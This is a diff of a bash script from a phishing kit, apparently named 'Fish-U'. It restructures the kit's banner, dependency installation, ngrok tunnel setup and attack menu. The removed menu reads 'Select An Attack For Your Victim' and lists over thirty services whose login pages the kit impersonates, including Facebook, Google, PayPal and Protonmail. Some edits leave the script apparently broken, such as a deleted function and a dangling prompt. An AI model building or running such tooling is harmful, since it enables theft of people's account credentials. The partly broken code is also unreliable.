@@ -60,9 +60,10 @@ kill_pid() {
 
 
 ## Banner
-
-cd ..
+cd
+cd Fish-U
 cd ui
+chmod +x *
 ./intro.sh
 
 
@@ -70,47 +71,20 @@ cd ui
 
 
 ## Dependencies
-dependencies() {
-	echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing required packages..."
 
-    if [[ -d "/data/data/com.termux/files/home" ]]; then
-        if [[ `command -v proot` ]]; then
-            printf ''
-        else
-			echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}proot${CYAN}"${WHITE}
-            pkg install proot resolv-conf -y
-        fi
-    fi
+apt install php -y
+apt install curl -y
+apt install wget -y
+apt install unzip -y
 
-	if [[ `command -v php` && `command -v wget` && `command -v curl` && `command -v unzip` ]]; then
-		echo -e "\n${GREEN}[${WHITE}+${GREEN}]${GREEN} Packages already installed."
-	else
-		pkgs=(php curl wget unzip)
-		for pkg in "${pkgs[@]}"; do
-			type -p "$pkg" &>/dev/null || {
-				echo -e "\n${GREEN}[${WHITE}+${GREEN}]${CYAN} Installing package : ${ORANGE}$pkg${CYAN}"${WHITE}
-				if [[ `command -v pkg` ]]; then
-					pkg install "$pkg" -y
-				elif [[ `command -v apt` ]]; then
-					apt install "$pkg" -y
-				elif [[ `command -v apt-get` ]]; then
-					apt-get install "$pkg" -y
-				elif [[ `command -v pacman` ]]; then
-					sudo pacman -S "$pkg" --noconfirm
-				elif [[ `command -v dnf` ]]; then
-					sudo dnf -y install "$pkg"
-				else
-					echo -e "\n${RED}[${WHITE}!${RED}]${RED} Unsupported package manager, Install packages manually."
-					{ reset_color; exit 1; }
-				fi
-			}
-		done
-	fi
 
-}
 
 
 ##install Ngrok
+cd
+cd Fish-U
+cd core
+chmod +X *
 ./install-ngrok.sh
 
 
@@ -127,6 +101,10 @@ msg_exit() {
 
 
 ##About
+cd
+cd Fish-U
+cd core
+chmod +X *
 ./about.sh
 
 
@@ -222,7 +200,7 @@ start_localhost() {
 
 ## Tunnel selection
 tunnel_menu() {
-	{ clear; banner_small; }
+	#{ clear; banner_small; }
 	cat <<- EOF
 
 		${RED}[${WHITE}01${RED}]${ORANGE} Localhost ${RED}[${CYAN}For Devs${RED}]
@@ -367,27 +345,14 @@ site_vk() {
 	fi
 }
 
-## Menu
-main_menu() {
-	{ clear; banner; echo; }
-	cat <<- EOF
-		${RED}[${WHITE}::${RED}]${ORANGE} Select An Attack For Your Victim ${RED}[${WHITE}::${RED}]${ORANGE}
+## Menu/List
+cd
+cd Fish-U
+cd core
+chmod +X *
+./List.sh
 
-		${RED}[${WHITE}01${RED}]${ORANGE} Facebook      ${RED}[${WHITE}11${RED}]${ORANGE} Twitch       ${RED}[${WHITE}21${RED}]${ORANGE} DeviantArt
-		${RED}[${WHITE}02${RED}]${ORANGE} Instagram     ${RED}[${WHITE}12${RED}]${ORANGE} Pinterest    ${RED}[${WHITE}22${RED}]${ORANGE} Badoo
-		${RED}[${WHITE}03${RED}]${ORANGE} Google        ${RED}[${WHITE}13${RED}]${ORANGE} Snapchat     ${RED}[${WHITE}23${RED}]${ORANGE} Origin
-		${RED}[${WHITE}04${RED}]${ORANGE} Microsoft     ${RED}[${WHITE}14${RED}]${ORANGE} Linkedin     ${RED}[${WHITE}24${RED}]${ORANGE} DropBox	
-		${RED}[${WHITE}05${RED}]${ORANGE} Netflix       ${RED}[${WHITE}15${RED}]${ORANGE} Ebay         ${RED}[${WHITE}25${RED}]${ORANGE} Yahoo		
-		${RED}[${WHITE}06${RED}]${ORANGE} Paypal        ${RED}[${WHITE}16${RED}]${ORANGE} Quora        ${RED}[${WHITE}26${RED}]${ORANGE} Wordpress
-		${RED}[${WHITE}07${RED}]${ORANGE} Steam         ${RED}[${WHITE}17${RED}]${ORANGE} Protonmail   ${RED}[${WHITE}27${RED}]${ORANGE} Yandex			
-		${RED}[${WHITE}08${RED}]${ORANGE} Twitter       ${RED}[${WHITE}18${RED}]${ORANGE} Spotify      ${RED}[${WHITE}28${RED}]${ORANGE} StackoverFlow
-		${RED}[${WHITE}09${RED}]${ORANGE} Playstation   ${RED}[${WHITE}19${RED}]${ORANGE} Reddit       ${RED}[${WHITE}29${RED}]${ORANGE} Vk
-		${RED}[${WHITE}10${RED}]${ORANGE} Tiktok        ${RED}[${WHITE}20${RED}]${ORANGE} Adobe        ${RED}[${WHITE}30${RED}]${ORANGE} XBOX
-		${RED}[${WHITE}31${RED}]${ORANGE} Mediafire     ${RED}[${WHITE}32${RED}]${ORANGE} Gitlab       ${RED}[${WHITE}33${RED}]${ORANGE} Github
 
-		${RED}[${WHITE}99${RED}]${ORANGE} About         ${RED}[${WHITE}00${RED}]${ORANGE} Exit
-
-	EOF
 	
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select an option : ${BLUE}"
 
